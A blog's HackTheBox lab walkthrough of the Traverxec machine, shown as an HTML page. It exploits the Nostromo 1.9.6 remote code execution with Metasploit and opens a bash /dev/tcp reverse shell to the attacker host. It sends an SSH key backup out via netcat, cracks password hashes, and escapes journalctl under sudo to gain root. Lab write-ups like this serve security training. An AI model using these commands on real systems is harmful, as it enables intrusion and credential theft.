<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="index, follow"><title>HackTheBox - Traverxec | Ef's log</title><meta name=keywords content="HackTheBox,Writeup,Cyber Security,Pentesting"><meta name=description content="Code execution with path traversal"><meta name=author content="Fahmi FJ"><link rel=canonical href=https://fahmifj.github.io/hackthebox/traverxec/><meta name=google-site-verification content="LlCRq--iL8r1HTz1DMbMvQyX2lZjWD-KnwFeO_OWlg8"><link crossorigin=anonymous href=https://fahmifj.github.io/assets/css/stylesheet.min.bd459bfe4940cb0279a97213c67be3816bd3751510c3b6af22df24e8740767ba.css integrity="sha256-vUWb/klAywJ5qXITxnvjgWvTdRUQw7avIt8k6HQHZ7o=" rel="preload stylesheet" as=style><link crossorigin=anonymous rel=preload as=fetch href=https://fahmifj.github.io/index.json><script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/search.min.dbf3c8b1e1d3feb24da21a556bdfb2f51a0273aa11efcd4640113536ee29d424.js integrity="sha256-2/PIseHT/rJNohpVa9+y9RoCc6oR781GQBE1Nu4p1CQ="></script>
<script defer crossorigin=anonymous src=https://fahmifj.github.io/assets/js/highlight.min.22059b46810f6ad868c7821e09643fcd3324a7aece939a3b9d810ddf8cc89e0d.js integrity="sha256-IgWbRoEPathox4IeCWQ/zTMkp67Ok5o7nYEN34zIng0=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://fahmifj.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://fahmifj.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://fahmifj.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://fahmifj.github.io/apple-touch-icon.png><link rel=mask-icon href=https://fahmifj.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><meta name=generator content="Hugo 0.102.1"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script async src="https://www.googletagmanager.com/gtag/js?id=G-PDN0GP97D1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-PDN0GP97D1",{anonymize_ip:!1})}</script><meta property="og:title" content="HackTheBox - Traverxec"><meta property="og:description" content="Code execution with path traversal"><meta property="og:type" content="article"><meta property="og:url" content="https://fahmifj.github.io/hackthebox/traverxec/"><meta property="og:image" content="https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300.png"><meta property="article:section" content="hackthebox"><meta property="article:published_time" content="2021-08-06T16:12:18+07:00"><meta property="article:modified_time" content="2021-08-06T16:12:18+07:00"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/ophiuchi/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/heist/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/active/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/shocker/"><meta property="og:see_also" content="https://fahmifj.github.io/hackthebox/atom/"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300.png"><meta name=twitter:title content="HackTheBox - Traverxec"><meta name=twitter:description content="Code execution with path traversal"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"HackTheBox","item":"https://fahmifj.github.io/hackthebox/"},{"@type":"ListItem","position":2,"name":"HackTheBox - Traverxec","item":"https://fahmifj.github.io/hackthebox/traverxec/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Traverxec","name":"HackTheBox - Traverxec","description":"Code execution with path traversal","keywords":["HackTheBox","Writeup","Cyber Security","Pentesting"],"articleBody":"Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on journalctl binary, and this could be leveraged to obtain root access.\nSkills Learned Path Traversal Sudo exploitation on journalctl Tools Nmap Metasploit Reconnaissance Nmap An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.\n→ kali@kali «traverxec» «10.10.14.34» $ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-13 16:11 EDT Nmap scan report for 10.10.10.165 Host is up (0.44s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0) | ssh-hostkey: | 2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA) | 256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA) |_ 256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519) 80/tcp open http nostromo 1.9.6 |_http-server-header: nostromo 1.9.6 |_http-title: TRAVERXEC Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds Enumeration TCP 80 - Nostromo The hosted site is a personal website of David White.\nAt the bottom of the page, there is a contact form with 4 input vectors.\nI submitted some values and then started to observe the network traffic, but nothing happen there.\nI ran gobuster, but it also didn’t find any interesting.\nFinding Vulnerabilities From previous nmap, nmap identified the nostromo version to be 1.9.6. Feeding that version on searchsploit pops a remote code execution exploit.\n→ kali@kali «traverxec» «10.10.14.34» $ searchsploit nostromo 1.9.6 --------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path --------------------------------------------------------------------------------------------- --------------------------------- nostromo 1.9.6 - Remote Code Execution | multiple/remote/47837.py --------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results Foothold Shell as www-data Nostromo RCE CVE-2019-16278 (Metasploit) Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.\n→ kali@kali «traverxec» «10.10.14.34» $ msfconsole -q msf6 \u003e search nostromo Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit/multi/http/nostromo_code_exec 2019-10-20 good Yes Nostromo Directory Traversal Remote Command Execution Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/nostromo_code_exec msf6 \u003e use 0 [*] Using configured payload cmd/unix/reverse_perl Once all the configs are set, I will run the exploits. This results in an interactive shell access as www-data.\nmsf6 exploit(multi/http/nostromo_code_exec) \u003e run [*] Started reverse TCP handler on 10.10.14.34:53 [*] Executing automatic check (disable AutoCheck to override) [+] The target appears to be vulnerable. [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.14.34:53 -\u003e 10.10.10.165:52716) at 2021-07-13 16:31:29 -0400 id uid=33(www-data) gid=33(www-data) groups=33(www-data) hostname \u0026\u0026 ip a traverxec 1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2: eth0: mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000 link/ether 00:50:56:b9:a0:f8 brd ff:ff:ff:ff:ff:ff inet 10.10.10.165/24 brd 10.10.10.255 scope global eth0 valid_lft forever preferred_lft forever Shell Upgrade I will create another interactive shell session so I can upgrade my shell with the PTY trick.\nwhich bash /usr/bin/bash bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.34/53 0\u003e\u00261\" \u0026 On my new session:\n→ kali@kali «traverxec» «10.10.14.34» $ nc -nvlp 53 listening on [any] 53 ... connect to [10.10.14.34] from (UNKNOWN) [10.10.10.165] 52718 bash: cannot set terminal process group (421): Inappropriate ioctl for device bash: no job control in this shell www-data@traverxec:/usr/bin$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@traverxec:/usr/bin$ export TERM=xterm export TERM=xterm www-data@traverxec:/usr/bin$ ^Z [1] + 3835 suspended nc -nvlp 53 → kali@kali «traverxec» «10.10.14.34» $ stty raw -echo;fg [1] + 3835 continued nc -nvlp 53 www-data@traverxec:/usr/bin$ stty cols 127 rows 30 Privilege Escalation Shell as david Nostromo config The nostromo config file under /var/nostromo/conf reveals that there is a .htpasswd\nwww-data@traverxec:/var/nostromo/conf$ cat nhttpd.conf # MAIN [MANDATORY] servername traverxec.htb serverlisten * serveradmin david@traverxec.htb serverroot /var/nostromo servermimes conf/mimes docroot /var/nostromo/htdocs docindex index.html # LOGS [OPTIONAL] logpid logs/nhttpd.pid # SETUID [RECOMMENDED] user www-data # BASIC AUTHENTICATION [OPTIONAL] htaccess .htaccess htpasswd /var/nostromo/conf/.htpasswd # ALIASES [OPTIONAL] /icons /var/nostromo/icons # HOMEDIRS [OPTIONAL] homedirs /home homedirs_public public_www This.htpasswd file contains a password hash for user david.\nwww-data@traverxec:/var/nostromo/conf$ cat .htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ www-data@traverxec:/var/nostromo/conf$ cat /etc/passwd | grep sh \u0026\u0026 ls -l /home root:x:0:0:root:/root:/bin/bash sshd:x:105:65534::/run/sshd:/usr/sbin/nologin david:x:1000:1000:david,,,:/home/david:/bin/bash total 4 drwx--x--x 6 david david 4096 Jul 13 06:57 david Password Cracking JtR can recover the password easily.\n$ ./john.exe hashes/traverxec-david.hash --wordlist=C:/tools/rockyou.txt ...[SNIP]... Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 8 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status Nowonly4me (david) 1g 0:00:00:43 DONE (2021-07-14 03:44) 0.02307g/s 244113p/s 244113c/s 244113C/s NuiKo910..Noury ...[SNIP]... But turns out it’s not a reused password.\nwww-data@traverxec:/var/nostromo/conf$ su david Password: su: Authentication failure www-data@traverxec:/var/nostromo/conf$ Path Traversal - David home directory The david home directory is not readable by others, but it allows execute permissions. With that, I can determine what files all are available under david’s home directory by spamming one character and leverage the tab completion. This is one of the benefits of doing a shell upgrade!\nwww-data@traverxec:/var/nostromo/conf$ ls -l /home/david/ ls: cannot open directory '/home/david/': Permission denied www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/ drwx--x--x 6 david david 4096 Jul 13 06:57 /home/david/ www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/.ssh drwx------ 2 david david 4096 Oct 25 2019 /home/david/.ssh www-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/user.txt -r--r----- 1 root david 33 Oct 25 2019 /home/david/user.txt Then, when I type public_www (from nostromo config), the tab completion confirms that the folder is there. With r-x, I can use ls -lR command to list all the available contents recursively.\nwww-data@traverxec:/var/nostromo/conf$ ls -ld /home/david/public_www drwxr-xr-x 3 david david 4096 Oct 25 2019 /home/david/public_www www-data@traverxec:/var/nostromo/conf$ ls -lR /home/david/public_www /home/david/public_www: total 8 -rw-r--r-- 1 david david 402 Oct 25 2019 index.html drwxr-xr-x 2 david david 4096 Oct 25 2019 protected-file-area /home/david/public_www/protected-file-area: total 4 -rw-r--r-- 1 david david 1915 Oct 25 2019 backup-ssh-identity-files.tgz The backup-ssh-identity-files.tgz seems interesting, I will grab that to my Kali.\nwww-data@traverxec:/var/nostromo/conf$ cat /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz | nc 10.10.14.34 53 On my Kali:\n→ kali@kali «traverxec» «10.10.14.34» $ nc -nvlp 53 \u003e loot/backup-ssh-identity-files.tgz listening on [any] 53 ... connect to [10.10.14.34] from (UNKNOWN) [10.10.10.165] 52728 Passphrase crack The backup file contains a set of SSH keys.\n→ kali@kali «loot» «10.10.14.34» $ tar -xvf backup-ssh-identity-files.tgz home/david/.ssh/ home/david/.ssh/authorized_keys home/david/.ssh/id_rsa home/david/.ssh/id_rsa.pub But, it is protected with a passphrase.\n→ kali@kali «ssh-keys» «10.10.14.34» $ ssh -i id_rsa david@traverxec.htb Enter passphrase for key 'id_rsa': david@traverxec.htb's password: So I will convert the key to crackable format hash using ssh2john.\n$ /usr/share/john/ssh2john.py id_rsa \u003e david_rsa.hash → kali@kali «ssh-keys» «10.10.14.34» $ cat david_rsa.hash id_rsa:$sshng$1$16$477EEFFBA56F9D283D349033D5D08C4F$1200$b1ec9e1ff7de1b5f5395468c76f1d92bfdaa7f2f29c3076bf6c83be71e213e9249f186ae856a2b08de0b3c957ec1f086b6e8813df672...[SNIP]... JtR recovers the passphrase to hunter.\n$ ./john.exe hashes/traverxec-david-rsa.hash --wordlist=C:/tools/rockyou.txt ...[SNIP]... Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 8 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status hunter (id_rsa) SSH - david The key and the passphrase are work for user david.\n→ kali@kali «traverxec» «10.10.14.34» $ ssh -i ssh-keys/david_rsa david@traverxec.htb Enter passphrase for key 'ssh-keys/david_rsa': Linux traverxec 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64 Last login: Tue Jul 13 06:54:56 2021 from 10.10.16.7 david@traverxec:~$ id uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev) User flag is done here\ndavid@traverxec:~$ ls -la total 60 drwx--x--x 6 david david 4096 Jul 13 06:57 . drwxr-xr-x 3 root root 4096 Oct 25 2019 .. -rwxr-xr-x 1 david david 18992 Jul 13 05:43 47163 lrwxrwxrwx 1 root root 9 Oct 25 2019 .bash_history -\u003e /dev/null -rw-r--r-- 1 david david 220 Oct 25 2019 .bash_logout -rw-r--r-- 1 david david 3544 Jul 13 06:57 .bashrc drwx------ 2 david david 4096 Oct 25 2019 bin drwxr-xr-x 3 david david 4096 Jul 13 06:56 .local -rw-r--r-- 1 david david 807 Oct 25 2019 .profile drwxr-xr-x 3 david david 4096 Oct 25 2019 public_www drwx------ 2 david david 4096 Oct 25 2019 .ssh -r--r----- 1 root david 33 Oct 25 2019 user.txt david@traverxec:~$ cat user.txt 7db0...[SNIP]... Shell as root Enumeration In david’s home directory, there is a folder called bin. Under this bin folder, there is a bash script.\ndavid@traverxec:~$ ls -l bin/ total 8 -r-------- 1 david david 802 Oct 25 2019 server-stats.head -rwx------ 1 david david 363 Oct 25 2019 server-stats.sh When I run the script, I get the following results:\ndavid@traverxec:~/bin$ ./server-stats.sh .----. .---------. | == | Webserver Statistics and Data |.-\"\"\"\"\"-.| |----| Collection Script || || | == | (c) David, 2019 || || |----| |'-.....-'| |::::| '\"\")---(\"\"' |___.| /:::::::::::\\\" \" /:::=======:::\\ jgs '\"\"\"\"\"\"\"\"\"\"\"\"\"' Load: 18:24:49 up 17:04, 1 user, load average: 0.13, 0.04, 0.01 Open nhttpd sockets: 0 Files in the docroot: 117 Last 5 journal log lines: -- Logs begin at Tue 2021-07-13 01:20:43 EDT, end at Tue 2021-07-13 18:24:49 EDT. -- Jul 13 17:16:02 traverxec sudo[24501]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/0 ruser=www-data rhost= user=www-data Jul 13 17:16:04 traverxec sudo[24501]: pam_unix(sudo:auth): conversation failed Jul 13 17:16:04 traverxec sudo[24501]: pam_unix(sudo:auth): auth could not identify password for [www-data] Jul 13 17:16:04 traverxec sudo[24501]: www-data : command not allowed ; TTY=pts/0 ; PWD=/dev/shm ; USER=root ; COMMAND=list Jul 13 17:16:04 traverxec nologin[24564]: Attempted login by UNKNOWN on UNKNOWN Sudo journalctl Based on the contents of server-stats.sh, user david seems to be allowed to run journalctl with sudo.\ndavid@traverxec:~/bin$ cat server-stats.sh #!/bin/bash cat /home/david/bin/server-stats.head echo \"Load: `/usr/bin/uptime`\" echo \" \" echo \"Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`\" echo \"Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`\" echo \" \" echo \"Last 5 journal log lines:\" /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat But, when I run /usr/bin/sudo /usr/bin/journalctl, it asks for a password.\ndavid@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl [sudo] password for david: Sorry, try again. Then, I grab this line /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service and run it. This is what I get:\nThat means I can run the following command with sudo.\n/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service According to the GTFOBins, the default pager of journalctl is less. Now since it runs with root privilege, I can escape from the pager using !/bin/bash.\n","wordCount":"1731","inLanguage":"en","image":"https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300.png","datePublished":"2021-08-06T16:12:18+07:00","dateModified":"2021-08-06T16:12:18+07:00","author":{"@type":"Person","name":"Fahmi FJ"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://fahmifj.github.io/hackthebox/traverxec/"},"publisher":{"@type":"Organization","name":"Ef's log","logo":{"@type":"ImageObject","url":"https://fahmifj.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class="header sticky"><nav id=navbar class=nav><div class=logo><a href=https://fahmifj.github.io/ accesskey=h title="Fahmi FJ">F's log</a></div><ul id=menu onscroll=menu_on_scroll()><li><a href=https://fahmifj.github.io/blog/ title=blog>blog</a></li><li><a href=https://fahmifj.github.io/ctf/ title=ctf>ctf</a></li><li><a href=https://fahmifj.github.io/series/ title=series>series</a></li><li><a href=https://fahmifj.github.io/archives/ title=archives>archives</a></li></ul><div class=search-container><div id=searchBox><input class=searchInput id=searchInput aria-label=search type=search><div class=searchResults-container><span class="search-results hidden" id=searchResults aria-label="search results"></span></div></div><button id=theme-toggle accesskey=t title><svg id="moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></nav></header><div id=mask></div><main class=main><div class=content-wrapper><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://fahmifj.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://fahmifj.github.io/hackthebox/>HackTheBox</a></div><h1 class=post-title>HackTheBox - Traverxec</h1><p class=post-description>Code execution with path traversal</p><div class=post-meta><span class=author>Fahmi FJ</span>&nbsp;&#183;&nbsp;<span class=date>August 06, 2021</span>&nbsp;&#183;&nbsp;<span class=meta-read>9 min read</span></div><hr><div class=series-info>Series:&nbsp;<a href=https://fahmifj.github.io/series/oscp-like/>OSCP like</a></div></header><div class=post-content-container><aside class=toc><div class=inner><ul><li><a href=#reconnaissance aria-label=Reconnaissance>Reconnaissance</a><ul><li><a href=#nmap aria-label=Nmap>Nmap</a></li></ul></li><li><a href=#enumeration aria-label=Enumeration>Enumeration</a><ul><li><a href=#tcp-80---nostromo aria-label="TCP 80 - Nostromo">TCP 80 - Nostromo</a></li></ul></li><li><a href=#foothold aria-label=Foothold>Foothold</a><ul><li><a href=#shell-as-www-data aria-label="Shell as www-data">Shell as www-data</a></li></ul></li><li><a href=#privilege-escalation aria-label="Privilege Escalation">Privilege Escalation</a><ul><li><a href=#shell-as-david aria-label="Shell as david">Shell as david</a></li><li><a href=#shell-as-root aria-label="Shell as root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300_hu5ab55a09715b9e25aaa2e6709a890f70_129001_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300_hu5ab55a09715b9e25aaa2e6709a890f70_129001_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300_hu5ab55a09715b9e25aaa2e6709a890f70_129001_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300.png 740w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/traverxec/imgs/image-20210806161256300.png alt width=740 height=463></figure><p>Traverxec is an easy Linux machine that starts with exploitation of a Nostromo web server. The server is vulnerable to a remote code execution, and this allows me to gain an interactive shell access into the system. Enumeration of the system discovers a backup files that contains user SSH keys. The user is allowed to run a sudo on <code>journalctl</code> binary, and this could be leveraged to obtain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>Path Traversal</li><li>Sudo exploitation on <code>journalctl</code></li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>Metasploit</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><p>An initial TCP scan discovers two open ports: SSH on port 22 and a Nostromo web server on port 80.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ nmap -p22,80 -sC -sV  -oA nmap/10-tcp-allport-script-traverxec 10.10.10.165
</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-07-13 16:11 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.165
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.44s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp open  http    nostromo 1.9.6
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nostromo 1.9.6
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: TRAVERXEC
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 12.71 seconds
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---nostromo>TCP 80 - Nostromo<a class=anchor aria-hidden=true href=#tcp-80---nostromo>#</a></h3><p>The hosted site is a personal website of David White.</p><p><div class=img-container><img src=imgs/image-20210714031626971.png alt=image-20210714031626971></div></p><p>At the bottom of the page, there is a contact form with 4 input vectors.</p><p><div class=img-container><img src=imgs/image-20210714031846286.png alt=image-20210714031846286></div></p><p>I submitted some values and then started to observe the network traffic, but nothing happen there.</p><p><div class=img-container><img src=imgs/image-20210714032010619.png alt=image-20210714032010619></div></p><p>I ran gobuster, but it also didn&rsquo;t find any interesting.</p><h4 id=finding-vulnerabilities>Finding Vulnerabilities<a class=anchor aria-hidden=true href=#finding-vulnerabilities>#</a></h4><p>From previous <code>nmap</code>, nmap identified the <code>nostromo</code> version to be 1.9.6. Feeding that version on <code>searchsploit</code> pops a remote code execution exploit.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ searchsploit nostromo 1.9.6         
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl> Exploit Title                                                                               <span class=p>|</span>  Path
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>nostromo 1.9.6 - Remote Code Execution                                                       <span class=p>|</span> multiple/remote/47837.py
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------------------- ---------------------------------
</span></span><span class=line><span class=cl>Shellcodes: No Results
</span></span></code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2><h3 id=shell-as-www-data>Shell as www-data<a class=anchor aria-hidden=true href=#shell-as-www-data>#</a></h3><h4 id=nostromo-rce-cve-2019-16278-metasploit>Nostromo RCE CVE-2019-16278 (Metasploit)<a class=anchor aria-hidden=true href=#nostromo-rce-cve-2019-16278-metasploit>#</a></h4><p>Metasploit also has a module for the Nostromo 1.9.6 RCE and I will use that.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ kali@kali «traverxec» «10.10.14.34» 
</span></span><span class=line><span class=cl>$ msfconsole -q
</span></span><span class=line><span class=cl>msf6 &gt; search nostromo
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Matching <span class=nv>Modules</span>
</span></span><span class=line><span class=cl><span class=o>================</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>   <span class=c1>#  Name                                   Disclosure Date  Rank  Check  Description</span>
</span></span><span class=line><span class=cl>   -  ----                                   ---------------  ----  -----  -----------
</span></span><span class=line><span class=cl>   <span class=m>0</span>  exploit/multi/http/nostromo_code_exec  2019-10-20       good  Yes    Nostromo Directory Traversal Remote Command Execution
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Interact with a module by name or index. For example info 0, use <span class=m>0</span> or use exploit/multi/http/nostromo_code_exec
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>msf6 &gt; use <span class=m>0</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Using configured payload cmd/unix/reverse_perl
</span></span></code></pre></div><p>Once all the configs are set, I will run the exploits. This results in an interactive shell access as <code>www-data</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>msf6 exploit<span class=o>(</span>multi/http/nostromo_code_exec<span class=o>)</span> &gt; run
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Started reverse TCP handler on 10.10.14.34:53 
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Executing automatic check <span class=o>(</span>disable AutoCheck to override<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> The target appears to be vulnerable.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Configuring Automatic <span class=o>(</span>Unix In-Memory<span class=o>)</span> target
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Sending cmd/unix/reverse_perl <span class=nb>command</span> payload
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Command shell session <span class=m>1</span> opened <span class=o>(</span>10.10.14.34:53 -&gt; 10.10.10.165:52716<span class=o>)</span> at 2021-07-13 16:31:29 -0400
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl>
